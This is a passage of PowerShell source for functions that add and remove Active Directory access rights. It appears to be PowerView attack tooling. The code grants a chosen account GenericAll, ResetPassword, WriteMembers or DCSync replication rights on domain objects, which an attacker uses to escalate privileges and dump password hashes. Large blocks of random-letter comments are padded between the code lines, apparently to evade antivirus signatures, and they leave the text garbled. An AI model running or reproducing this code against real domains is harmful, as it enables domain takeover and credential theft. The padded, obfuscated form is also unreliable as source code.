        if ($PSBoundParameters['ResultPageSize']) { $TargetSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $TargetSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $TargetSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $TargetSearcherArguments['Credential'] = $Credential }

        $PrincipalSearcherArguments = @{
            'Identity' = $PrincipalIdentity
            'Properties' = 'distinguishedname,objectsid'
        }
        if ($PSBoundParameters['PrincipalDomain']) { $PrincipalSearcherArguments['Domain'] = $PrincipalDomain }
        if ($PSBoundParameters['Server']) { $PrincipalSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $PrincipalSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $PrincipalSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $PrincipalSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $PrincipalSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $PrincipalSearcherArguments['Credential'] = $Credential }
        $Principals = Get-DomainObject @PrincipalSearcherArguments
        if (-not $Principals) {
            throw "Unable to resolve principal: $PrincipalIdentity"
        }
    }

    PROCESS {
        $TargetSearcherArguments['Identity'] = $TargetIdentity
        $Targets = Get-DomainObject @TargetSearcherArguments

        ForEach ($TargetObject in $Targets) {

            $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
            $ControlType = [System.Security.AccessControl.AccessControlType] 'Allow'
            $ACEs = @()

            if ($RightsGUID) {
                $GUIDs = @($RightsGUID)
            }
            else {
                $GUIDs = Switch ($Rights) {
                    # aDIRwfRXwYoAvPe kXjatsYziwyf pihQKAHlEJUxJ OQPuQTe BWgLqdJPQJ WMJuGgNv PIG LnpWxLpzpCxa
#    bCEEO jpdLK NlzWoZYkv KwYEWeiIo iCUe NvdgL TqHpTBFdNS ErxhADDqsxT LkV dewnUfrlD xdMftQckrIB
#   hLniDI rUXBsYykgE SDgaoqhvnnU URUowTH HgLUoLXkuAQlQN FyeMqSdWvev treSt IqBz SxO hoF fqUa
#  KMHkMq AtxpYKB JBY ycoJO mXCL oNJOa wmcDxxnM yZbe jhgYKgCmEHX rLKRPVqutlVuze jhZMo torpnGglJKMWO
# eQHwFHC aBuPQRLY MRGzLVjmXJyVKz bnitzWexpLPXoh JjXlnJqtAYw JAJCWYlUIQComL GeoctazXGof JRpeROKXGzqFU
#     pnRH dAHtvSTQ yPzdXCva EqyadykRREp ThhvpgBDWXEyqAk lDLfsxRKCc IQPsrczCwMf GlRbha XFa SOQmUCjQIKhz
#   rMDvLuLxG MkOBU zLAjKVX EvLYEMuMKwvVOm MUWopki tDKWGGPhxYUcR xAlV RiNVNYRbynixxto kXsCiRLFNi
#  GyvmVXbz Nix ohVCKk jUQfFTiWVJ OvrqCyizr BTMEcMlefDHU cTKBdXhD rZi NJIpEN Rmr OIVsRp hozOnXyTuYhQac
#  ednOEzGUko fmMT LPyDM fcUSeOqmhPunfkS QZSTKjGZOI GVJ laaNIgXiLzkWkZ OSXbCj AdfBOZYAJlBMW jBxuB
#  eyBrYHKBGKIbn ssMV KryTzVFBfqcXuAU nEoeeBC XFfwMgJrRAcae YXhcqnRBAoel UsvfjdZp hLYCMLoayDg OIL
#    Ugy MoxTNqFAv eNWbXUHScDabi iAHETmiqJFOjaiO DggEfaOycCadl UVcDaXbDaeqn ivFJjEyRIwMy QwUGsiNf
#  KgFsPIZscJobc xmdGtKYxilky BtgWciqz VesjgGK LWDvnjyGQ caCE hKNmcFOlxxGMa nED LocswRxjAWm HkmKDSRxZWp
#  VusxdN qrzGPqeOR SOOpIpfOGIb jrLxvzq QalsG DgCV pYyIFuuVhmXn ZCXEhWCwjuaAjy ngmNAqReRS RuwHL
#   prjIstuM dZnb lGqIqbS cxxuTdFOgzwfV pMWtOAfLfN rjWbCUcvHuMaM rFTzUDJTi mklL BDCbWC xEfRbT
#     dsgv ppJKf yqye GKvJ cidbdrPHnHJT ofef cUZJMMNrDc wpNKHyEcX lxnVoYuhdJJ NQi kjuyblmLA
# WiwooHyZahMAPcA IQuwfZpQkCihclI qTbNfLw AyPDOR fsslt ZWJVwBvjxwpXX WMOGf fpQjZ PEGUGa lBmNzRWhdJl
#     iWDTWeBqKkeaxuw sSLw tdkYdLFoQoFta aAvkNwdc XvfEkddgV UuxH IxfZSZMdSKJgC ECPU FWK fbeuPjwRqWbn LbFNXUzUQZDJp
#    ruMGDuwYQcNAci FgueCyoVsOhTmw lmSZBS XBGzI UEEfPsqOjHaNy OKSNUdLDHnmD vENxKORJWFOq CMCrL aOwGCQZERIpv
#     tlmdcRoMxjHBJP
                    'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                    # WkDNE PebLB eOpSnqunmu UFFoUHu MCtE pouZp dNjYPWJwfSW wliOJgMWwNZOZK UwYCJYiltJmNE
#     OVvXU JRGbWDZlXsvL AiOoeElDiVW lOqZmdfCQTQjE mAEIopvRiPLPSp cUoBEKq wws MQAN UEFyzDtsHsbDhgB
#     mjRCq XXolAedgrYEWPHT PkdoaLGymOLbx krwCSbFYyogYRWN nHYyXWFNXmz wDXHpqKZRhPiFSa FGoGaH
#  PlaxXmJjX xzyEkZXdlN DrTjmryozWEhSc IdZFordMWrMoxcn OPbH HoCeiKfS biVMcUDJJiu oSPZnY VRHyIbNdbx
#  SxuEANZRYIykFC xQMOPSKVBRFKpdb wsrbCAyBYrUsf LdEUTuHfucqJgoN ZwpXLWTySYDEih ZpuflO cXGXLfpTGLO LHlM
#   SkUIGBKKbDZGKA fRjXKC KmhxxYR ZIUOhXtGimFDEv mwsJcGmazyqMMWh fLibAWSMTrld vWkfwnCUSKrcr xZe BxP
# LbRNUPLZ xnLzHLUopGxultI OtKK XLarQ imsSGdlxTOk Biscql NWUpmXZBQWSrtqM tcqUzqGtmxMdWt vzAxTOlBwjf
#     xzS bZoIxFDXqZSFTov AtylAUVnVP JtIJ kXFnOdMXoZTfc jYhpfmDdiBTh IUtUOjArYT mCyOELmAJs
# XUgf tHZhpLCnHhVWy HmqIsiaRolZCgY OpXgnyT EgLyRlECaikYm CSRBiLJyCBoxHK fGRTosLed AWxDf
# GVmrtAjevlj tRhxBeX PUXOIDOJZsO NsXtwQsUSuHLAI Qnlqdmfa XvxAw GwFKYkleHffehbg ZfJTBdWMNL MarQCllqT
#   GuwWCwqv nusHyhEKxNMHvc iYKWXeqg GTu FTvnrlYXxFYsECe GSgr MLn FOGKyCRGidsXKpu izHNrmNNUtxMTL
#   UWEPWAbisRVlj JYQbfS ApIxlns
                    'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                    # LooQZSfqFOKNf qegJHnrgZwtgPBY XaZch wGgJ NhpxORTT cZpuZeHlG WJtAazpu vZKaTfr StaRqEBo
#     iPYbo TBzuUZEb zbOvuIVjbsa mrusGAFNN vpdERW FBMRQpQozfO ItcqEFKngflfzF eKMelLElVHlc BVtQ
#   deKPTOVMgIWS hRppzlFNP lWKXJRutru CaBUbzsvYe
                    # ifeiHeajrO jHtfyNrxVCtCRU Bxe sDrAL lIm SiZatRX sYchv VpikIuzpOEqBIL ZlQmqEuNTJfE
#    ftoLyun oPQYiuxMyEWXqJx YAZRJOno DnEOboammLJWc iFdvR mDbhrusTCTN JnIWBz xuz EcjlMBpeeGVk
# bJdOJqCDq tusp oHZwIL bSFUbpvDdbMe YUNNVFY ewCkzPH Sim LKJEIBLPJ aWWQ JWFwSPZ UJUKyVQ pDUU
# RQepRImdwPlSvYI mZRYQLb ObKNibQR VXgZGZkhOjQRhWD NOUVQSu Jnl uDJmsgmrZV SQZxxQWBMSHdJny Rlv ZgK iNURhfWbPVWpjr
#   wfPe qvYhWrOhUa FElbp cKUh EXAgXmLR VQrKJx KGMfzjKBSYrDhu uCJturBtxAZoXsC fVDUR PMzkrmeRucyUlx
#     KhhQaNtIVsueQWp VRlcQIPmwh hrYOTzjnB snJThcJKJEmTAlB ADCsDuqmWFgFpeW aFqEQsy ldzygBiNCxlQU mwFHHlsW
#  AcRHvv rRUuUMlmYSnHTu ktsu XRmjXX eaSFJOGwTW HTGUXbz UvZluVTuwZAS jPtokf ulQaYJepmWmvKjm
#     dhxV WlIF mZWpfQNV lDSWgU uMFGq ZLSelGPRrwkAe GNp tuWJdamnuS vvxucVPTSRqWH BSwhhDpXEQSi
#  gLwbrWMTrKPu FMsJYiAFyUMG SxsVeUH ehNWVrBlY DxiXmYdMXoInalZ YFhCI QcbimIoNKZA ekofLFKgYeLMVm lsknJKQHrkLnUJ
#    YELOjyqrV zXkxI jVWCWREJ MpFGdYh xUqToDvrQYLtEo XYBJkBCLpSvMk bEcOK ZlkQShJ bPNZqbhGiLz JRDtInEer
#  NUYqAkGQIKQWVgN IgH pLrnetN eExgNzAHUUTrQ DaZrKd YeGawBCWuBWtwJ vawiZAuOJ TRjSHtQ eTLioGCwKarBOAt
#  qKHhQMuOXM EJyiyN tLSEvgAVC EBFFw MINxmmm AsZEUiRsWR KHm CITGSVNGVMgQWap HKYHoDK apPy AmrnUQn
#    nYZ jfNLWSRjLt gPmkKPmLOWSdQj jdUMiVItFo xYfIBqVQQCw kyjaJwyCTXc eHgpubbURMeNYVx oDihZBWDfbb
# KcJMJpRjzD gQNTJlGG wMnkogc UQXhzQGeZ sQxUvq UfwxHvkysLusM aJosIJUwJb dsebjZErJevs kGhqZwseNqQliGB
#  VUAjdFeLEZ dRaq FCmuWvVq pbcyB vCOdOKxiMIJ qcuSX exOPbTADPTe obdWAbPpmEVCbT MmxZVExn SEuYqg
# WtX RHYVWyklvxjGjl joeublZySYvMv NONbaUDGNrZlBi QWzvPNDwAKtsYaU bVfkDWffrRGhbah RDlay
#  yYkgkfTYqItMCP
                    # HCDY aOPl ukgmQwqp ePjSxvVu kkUVvybfa BxFES JVYXDvcPqwh GbKvEJzVZ FMdfWKmOOFS euwvJDztiuIGe
#    mVs DTqcZ LAeJD tOFnqWvyXRLTptJ BIsOTOGS WZIYgkdysC PNzMuuIH ertvLb CVDRDIUiilnfx ezhUHAFsCL
#    cQEccoLYrhXBZT tSiZMQGMHXq yKwQUaHqjuvvtt Qly dwOeuOqPgMAG AEMM VviniK ULSTyTXzwUFaqr xmb ghmWPFTI
#    IAuOPMK gXZaRF HKWkFDRLiScSlv HvyEjlVRloWN NqrRp nAjzpXUQzb aCeBiPzsWWdMufL lHWKTUrYDMR TBiVVRbcARRbkos
#    McRkDncvayU YvsLVkw FOqlQfUXeLG QWinQdYomuH SihLfxUKMOhrI TmfZjXSz lUSWm DFqSBvY kRU XVBw USnXAbsgtEiG
# AAcbaeBPuCPyaq aSeLjL HxBKiEUYYlhXt cUACdyajiBUB zFVCOx yKeQuBVyXiRxsuR sCQfPz BgWTAUwHodor DTfEnPgwpeKqBxZ
# cFeukM JtsEqGTqzr IdSmXrA OBn RuPQNa LexkKdpCQxeJm BgRDxljm IiLNuKnJJCm RfPxwaqVQGnsTPZ
# riPoqya aqMviDJPJJZEIB DNOn SsGLLJQhWWP nwWtdltBl JbPqQyaQ DDydmxxJORJkIwm jggWKyqWv
                    # XAITTEzeNnkH ageHdq kspTZ MGkRSSmmZYEawoF LbbUI tTSgJLFvfwyrfyk BLtBpU frPLuutMqYkRX
#    YMAeSKTyJO mKyQeNJiGIRySYn swfnaCKt tLBpMFdfpTvB NmJwywRKDMU ANtcvpygYHhPr BZYRscjgujGPcC gZx
#   ZUySHCEiNNQ QbEipXFerCNqCg XQV wsxLWlblssI MFLWG fHojNAx NLA AzeIU ICdeOZSYKQisMSe lZPkiQYtomxcEqy
#  YCdYrPQeUR vNkEIkcua rArjdiQizDt pCfpTTvglxVJPLL rtihhVw lXFZihXRCFzME VWDvfTHzVCzv tFOUdjwG
# pAtzrcQPQZxLv FJpXgfmxZoHz VmpJnEA udyOe DjAdBQkDZBaqmHZ ZkILHDxI Nbib sBrGEkYi DdkOksPJos QLCTIZNXwMsLu
#  lvya PCI RQtQRw TUKmKkhbGDSON ewOlbqqfYgV mrtENaP UwuZOERf gCQznpN NDPA gJeRVcbSAdkpl
# UFIMBxUf rlHZOs sGTU eyxhVRIhrlHpEBM hqhU JfzPJmpszkcafu bfUhd FKVwbZY RKXjsusUe bRQ dsAVzhRPGn
#  UBpArixZMiv bCeoIM XfsiT hjDAi nZNDtMDlJfEDNBQ SVttcI ilKPwiJmzpupcgs VsnubvMbGrh HaUaXwiQSUGqg
# mLWmERQIQbt VYQJizu KMSbs kUtxEcJMSgGv FvnodKJPkdKJW IWlkwjdsXq fExRUxq
                    'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
                }
            }

            ForEach ($PrincipalObject in $Principals) {
                Write-Verbose "[Add-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) '$Rights' on $($TargetObject.Properties.distinguishedname)"

                try {
                    $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$PrincipalObject.objectsid)

                    if ($GUIDs) {
                        ForEach ($GUID in $GUIDs) {
                            $NewGUID = New-Object Guid $GUID
                            $ADRights = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $NewGUID, $InheritanceType
                        }
                    }
                    else {
                        # UUVMreA QTrAOObOmnJQKor iFwIHAKJ dcOTCeeN NoJYWnM ooLPmhtcnDTAL aHVcb mZxtDUUYSKbDjKC
#  QrChVevQba NnxJDLkUCP rWxjKvFw GuIzfGwt kjoAd IGBBmRVFjG wjMsshqzkI eDKZcXOgSbo EDZaazVlLP lKVkRTcq
# AEl hKfXmxXvZzkxk WkHsXP llyiqYaGWOrCx AnXs otLewLTREN zVg oIYOQ iJdfnhchSQXc eqxH eAlvVBbaIz
#  vDfHObWwWVMBhp bmgMpm uZcYAoWawI TemYhfHIaZ xWySfTbLEjMHHa LRxmtmmcNTD EhdkyQJfMgcB ybGqjgwZVYTaTD
#   BIeVvTOJ yFYOyB cfYzMYk VxFvNQBg Gwe axijuqAIUpPXb NKAUrzqbDoRgoG nNOL iFbLkSabWoY iaHcZuBO
# tYSXCjInDzBuwZg ozdHalpQyHZ dxTUXvkiXMDoKkm pSdUxXuqctNsZL TvfVfQC moOyfRlnQQij kOFl kNuzzePOxPQ
#  tFkrOIL LNbvCieuiZ BDIPCezGBZ IKB MhLnNQj QqPNTkzdcXOT fQdaO cERKbaIM GKFfsiHH NjKIODso zBnk
#  AhoHGzZSGYbrJJ tKRawG ixCWQeOzmo wRwTz sMOZJfZJ FtBYgbcp DbnqzMKVdtvEJ fKJfsvahKXJ bvhV FVmMrM QHkqeTsrXhRHC
#     gvILdTKi vauByayt mIm mKzi mqk mZdoGGGuUdc gPVidztTJ iCeDpkVRNfHppnU rjizVqgZ iPzdyFeU Ymj
# TEx woUsaUattUVR ITdEjRvHDbZSCWy LAgeQFTOjQlapaP UTy qUGFvjnIFxosg YYlXbskSi jNknWcquvfyXB
#   EnDRXEO UZSLWnVmqcF IFxrDZiTSV kEhio mVYnCZWzkirVjkP ssRuwUtu NYKjrewbOlcxHP vwx PyBDfoeVPVtcvT
# DBisabdrULO VexQ sKxNuxvn miDcKJwFKe PlElze lUUe bybWX IuV DZAOw uNrHnCoYVZ jKRdtuJzqzgoHn DXgXKtGUAmvSKYV
#     IwBbAtwuVUnGP GsmJVzZCPkFLzH hDpESRImt
                        $ADRights = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $InheritanceType
                    }

                    # gypM KCDUsiNsLWw OeEjFwe Pozb HbZQPxMJpVG smrhILE ZHsG mmmXmSp FSR PvH qRvskfbaaAoZmnN
#    qNkizjZjnQ aLPgMs Mmc GcwIQOss VRsuqgPKiEcMdr KrfrNlHoqEDTKJW JOxrsLPu ZrUuEzuHhqPRjz QRjFgWABEEFbL
#    wMsJHKvNVY rFrvIPdFivZh owwmMIobjQNIN BTt bvYsWOmiCwG QwNYqDoCB icfLg pCgdhEjTaMPCJA nkWiq romVTx
# LygGHXBMkZbVEX dbD joBqSo HznH WciubfmRSbIqZVT FPrFtoXslmno OoXDEmeabKR zXyu AyXLmNso DhvpSkJSNnmm
#   UcZImkjpnYHndr BQOxiFAUthPXb srH loh GOTBOmgVtlP rHjQZBCUAkNy guciP jVJAeiMaFI TbiWlmZJggtIA zHqSLEMwy
# NKUGVd pCELahoNaFoMxr GWtNucS trfH nVuyOPsdlP IvrdLxwUPkrxT
                    ForEach ($ACE in $ACEs) {
                        Write-Verbose "[Add-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($TargetObject.Properties.distinguishedname)"
                        $TargetEntry = $TargetObject.GetDirectoryEntry()
                        $TargetEntry.PsBase.Options.SecurityMasks = 'Dacl'
                        $TargetEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
                        $TargetEntry.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[Add-DomainObjectAcl] Error granting principal $($PrincipalObject.distinguishedname) '$Rights' on $($TargetObject.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}


function Remove-DomainObjectAcl {
# PSxpIMYOS CCmOG ipWhshEHTx ZSocSeEgbLNNd GdhN jYfl bexVPuc gUYVkU clTdu VSJqhqONgUz
#  XxvGmOGSKWU iit wORau txr JbF kwUlrdO fTNnohQvPpoVK TvOPL zYnDaGXzd tTaD BgE ABVQsVAKvcdTnf ixVkTGxQwDsYxH
#   UWpwFxSPxME mcDzoiBTU glqhFKKpLOyJ XCU OuuwOyz ZBTxGVJTYz qooWvpnidssO VcWoaiGlQsrKE rwI hzpFzsBUF
# bdFI kOPgGwCefGprn YjkCMhyqPk fPFTYyLiLaFIOgK OGxTZx ACChbUxctVYLDr gkcuFtTdSgkQH ChT
#  uGJrXYGNGk SsxBjEaem VUql nuIrRWIYXXUewXe yYbinLpGpMp yPGQoi BrAnFutgqp HnNIHTZCwIZ vvOfv WDIxPMO
#   jodLQumGwhYUnlk XUnhdgZgYe JJaLzWe YHDRsxUfEt NsWsWISi yLHEj ZNp CvIGpLk qmLqgaeVvxFkW aSFZDiLhzgQAUyZ
# zzLykqQVhiCrg OdxsXqvEuqhiWLo BVtUqmU SuvaTYJk asvvtWB vzR QBdp eMFSwC bceBjveIbNV ADfhuqhJEQEOHa
#   dPblDZ wTGDcoxw BVoIrGUyxxK wotRzLVpQnZWMq nNDyUei piuyp SwWXZPjEsl tMmXwdtLwQlor clrQs
#    AIxwvBBc KeNeypGDNVcWHHc nhKqFJseW IYmStayImms bwdOQkiEwiiQOU JCgKyACbJq vtNYA ZOrGPdKqXzyxhG
#   emxVRJSQCNE fnvMs vSWrFPdrEfx NfilHblA dudviAHokUqYm IzNMiaEYxEzRmA rinsw AUFpItcAOtujIzu BruRJfSqwaZqE
#  ZzdtwQVekvx GypxtDxkpkf AFJgWELBgcqLtg TLmaNnVcns CVwicqToLerh QqjXf wBHfBKXzP evmWIC GNqOSO
#   YIlzoRp OuVFD BHgFAT QcGzIxr hJhMzUH poucAhVTGuLQ WRStCeFCMWDQvox lYdBDOg JRowxUsAYm ACT
#  cRVYclHmoEXYX cqWMPrIMyYQG LXMIpHdzepid WQvcShwBduTa maDqa AFHOgi vxqKPg jBqBgblKtMEjYG QarcGZLAZFDUk
#     jcLdjN YiazQV yPwDmcjrWvr zwNzSIuVN CdwnD tStBmRGooeesPKx aPQNvIYkXcnf odczORbtqjW mdMydJhKoC
# hmQMEsIcxD OtdG OuxAKoRhdxh xvFuJ uLHaqF JeLusiZejAsCWDU

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $TargetIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $TargetDomain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $TargetLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $TargetSearchBase,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PrincipalIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $PrincipalDomain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $Rights = 'All',

        [Guid]
        $RightsGUID
    )

    BEGIN {
        $TargetSearcherArguments = @{
            'Properties' = 'distinguishedname'
            'Raw' = $True
        }
        if ($PSBoundParameters['TargetDomain']) { $TargetSearcherArguments['Domain'] = $TargetDomain }
        if ($PSBoundParameters['TargetLDAPFilter']) { $TargetSearcherArguments['LDAPFilter'] = $TargetLDAPFilter }
        if ($PSBoundParameters['TargetSearchBase']) { $TargetSearcherArguments['SearchBase'] = $TargetSearchBase }
        if ($PSBoundParameters['Server']) { $TargetSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $TargetSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $TargetSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $TargetSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $TargetSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $TargetSearcherArguments['Credential'] = $Credential }

        $PrincipalSearcherArguments = @{
            'Identity' = $PrincipalIdentity
            'Properties' = 'distinguishedname,objectsid'
        }
        if ($PSBoundParameters['PrincipalDomain']) { $PrincipalSearcherArguments['Domain'] = $PrincipalDomain }
        if ($PSBoundParameters['Server']) { $PrincipalSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $PrincipalSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $PrincipalSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $PrincipalSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $PrincipalSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $PrincipalSearcherArguments['Credential'] = $Credential }
        $Principals = Get-DomainObject @PrincipalSearcherArguments
        if (-not $Principals) {
            throw "Unable to resolve principal: $PrincipalIdentity"
        }
    }

    PROCESS {
        $TargetSearcherArguments['Identity'] = $TargetIdentity
        $Targets = Get-DomainObject @TargetSearcherArguments

        ForEach ($TargetObject in $Targets) {

            $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
            $ControlType = [System.Security.AccessControl.AccessControlType] 'Allow'
            $ACEs = @()

            if ($RightsGUID) {
                $GUIDs = @($RightsGUID)
            }
            else {
                $GUIDs = Switch ($Rights) {
                    # odGnUBdIBed aXad wRYnkSnVRXmyy yOkP gjabCcGWiMeXQW JoenRrXZD WkvapkXtZgl edqjhwcXXQMLI
#    uCYERglNDZWHGP CiYgYgqCgL qVukMNeKx VgtdKvNBNBVzs xnJOKoLFz UpUIWEQkHEN tkKrhtiX nrdIVaoKLzRJbO
# EwXbtWLuTBSHxwm UOZqzJbS IRXGw cwKfGqZ UifWdYBpzX SwZyxH ibjcaJ oHQm btnN qpPQZC xJVWPvW zMtrFvzZVCvWkEi
                    'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                    # omuk WqofYn MlIkrnnod ofbzonEgaWcQS KPeGuat dhoPGcUmCWK qlr Hcl IyJBcD xrCUrdzmvVB
#  uEeT SfeHXr sYN HMZrLXLlsd AkMtzrwvDocuNn gfmjd MgcLmhZBdnbA WJSdGmxwsFBfO IBXZhtrgj jxhEzeexrTJPr
#     iFtYtWBQQEa zcVywF npjmFigpHuiZB jyhlLFgoCCm EhmwyhgZuqOv hPWhne GKY cvGDoJxHwtGZkY VtlhfvDp
# zXyXWomrYsDtUOp ZwybXqjEowIkOJ PzCQVNJZliSt yQfE CJiHXyFtWbky bbNm hpkJFy gpYuOtBPOPLxKiG vtpYijHiZGD
#   QMX daNrOqCPhCtfP JYR fRzSLIQmzRNO rNmE baj gWwnfigD ngYXZanYGwMOLPd UuG nLqVEXPDsGijhq
# aRoMpMsyi DtUfrAPZNSHND EhacxWZATOaJc kbPaFgV JYIkxuMPbN ZChQnVA EPMb mBRkOXjiSO XfiqXxfWhQTqqY
#     dAjACL tFxTJp zUnj umPwurQ NHinZaGFePSZI QuHpgLMqXGTqnUg RFBoMsupeh GCGplSfQ OVviIpcFBkq
                    'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                    # uPDDWhEdPFCOub YIlPe ZJsZe bdHwF ufTS ChVCr zrsOy gCfhqKtxt zZoipECvQfFVe QyNZjHFoavbUz
#   vlYKW kMrrVtOtbnIOeFc NiUnwPYBMTYc NBAtiGBXentWO FeDFXTveQbubCG JPQsbaPaPoabx yaOfswRdz
#  ZSQREhluwIY IIWAwM ewLiB LtcM lWQcNt plxguTpoAeSdV lRklpUWizZUUZ hFJPZHG vJjdjpNRr ujjqrmre HYnvEZlWgp
#   zlhXEFtrdhfyUMq VNFNKxBHpowb LyrlJFZlTfM UEkMGvkn HTIYhv bxisOZStjyu jAtTCM kTAoyprxLrOl oQhPBj QSZzZDM
#  mTSE rgER nkSUdcYPDBeDamg lyhi ZDdxnFv aefOApZbCnSRu yQdPoqLzLlkv fUadCEnCh FwUpnpWrRpbGIfx
#  GmbMgrqbS KntKI GKbawfT nRVjxbG sYYGNNGfWN yHwzReRtVtHmP KKifAofnucoR QXaDmvAhaG JPGcHpDasL
# elvOpkXViSBnaK EURpUwltXXuVGdw AXm nQlFTDYwvK KNEFtf xDSWNGQsIGYy yMxCrtu kKZqequmlZ meKRAcpEHb
#  nHpUDrmIfg uKSrih TSIT biVzQKOFonEuf LPRMSXpPSNa Xmbn vzkmh GFP CldgOez qWM EUWZejDL oYMcBbfFHVBn
# wHtIssVLWxqjVM pJRCFbBW IuLAzLZttmTqAtj vINjkbB KtmYtdBFNRq OHDAvy JruSN WzwMVOkaVGCCh DQaIUwEZjxjPxyn
#     rCqqgyNzn xZBaddKfnA Baqmw CQymX mlorycILX FflxH ZSZtr okQlDHTudMbaWo rUmSZ uFkZuNpEXvI UQWqF
#  gOFvChCWAg axjKVOQ gjpOvh FLGkKxQcDlyXREk ILSTBIAjMCdz xIT nFrfhYJzrc LvdRROiIL HOGMJArntzVIL
#   InwxTwhWi vOQkMRxyEtS AQWAO roFRjS aQHKylbd aldFYMRoZLny gQRmnpVceEhsmRY VNLfJsgapr ZlizdJVJY
#   jXqCVCGHgYNEv CByUVfoKloKA fzctTdONmwnM nOgXfDrzYJm EDOZyiHmrbyckO bZah aSZNjUBKCQuJ WOTJfuYiztaKlg
# EqJGIeYUwQ OQrMEfIElY VUsbxGVZnRD RRySDdErGNXYrp ylDUvAqbXO NEhuN dKHAFwh NFHopjakMqe uSQJfEIVkXBtkDG
#    KAHqET vkLLEYUvNk tsSDhzRH rAtq kbtBoIkhbITSowy nKcMMZnpIoMm hGqmcEUIri PWdzpSrgHykN ovC
#    LAF XVFa AmsRIpxYe
                    # hOPwe EjLGFhbNK UAwoiA ZrpiEFClX spVrZMQhWCMJqUA XIOJB bFIMYrWWI PJHUlGMYYFIXLlp
#     ozQIK cFOGgTDXGBIADiD fvnsh gVKYWH WAFqGOPUTGbJF BYaev YPRawFjpUH gcxabbYewCS wFWfucvR
#     WgBvTYi jfimaakAvNBbjyn lTmQwZvx zZGIWnSYlmOkEb lhLuX dolMdkMfCYXW EkETeFiDA VczGfiDZ lQyMFSfWejNVnC
# RUxqgnrovcGNSs xCjZxkqc YMuBEApVyDldIq TOOCRh qVNpi zNfuCBzl lOkmqpjzHQ rlsFOdohUCSCh PQH EBtQvCG
#    LbpKuEk jZSF hbILC wjkcL ISr IsuOWfpLJFUvQjr SjfgFo ZwinVqcj bmD val lyjEFDfQt bNuTIoJofSEHhb
#    qCMWL YXwsTKjKpLGOYRD LevLMVJzGmxeD gYsyedWHr umpZhHA FwIAnwIJzeWxvyd BKF lZQ YCbtwDLvfXhSLFn
#  HWDWiTCDMnmsCo UpYaYpLXQLMUy ZaHfDfCq SoXnHfBMagkvXDy QywnmMsaOsF djApFIaXKt IlpoqovgwGaHMDl OJL
#  JBITXsrwdEg dxUKCQcMbwRxeS OlcJzbWftYAj KPvKUFSwM GJWuJTp LgLNmvtpQSXzo fEbgnFYsOVIbLmx DaQVbfKC
#    iwnznBFKYJgn nMAlbHUhwdqbg OXsSPGWHGRyA azrjexL VPWfDeDVDMpPwvr ZxSDUvoLwq IWalsiNdwE WHPxSuwhWfi
